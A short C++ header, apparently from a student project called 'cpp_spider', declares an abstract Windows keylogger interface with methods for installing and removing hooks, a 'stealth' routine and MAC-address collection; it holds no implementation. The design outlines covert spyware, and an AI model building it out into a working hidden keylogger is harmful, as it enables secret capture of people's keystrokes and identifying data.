//
// Created by 53963 on 26/09/2017.
//

#ifndef CPP_SPIDER_IKEYLOGGER_HPP
#define CPP_SPIDER_IKEYLOGGER_HPP

#include	<fstream>
#include	<iostream>
#include	<string>
#include	<windows.h>

class 		IKeyLogger
{
public:
  virtual bool 		check_upper() = 0;
  virtual void		initHooks() = 0;
  virtual void		stealth() = 0;
  virtual void		unHooks() = 0;
  virtual void		getMacAddr() = 0;
};


#endif //CPP_SPIDER_IKEYLOGGER_HPP
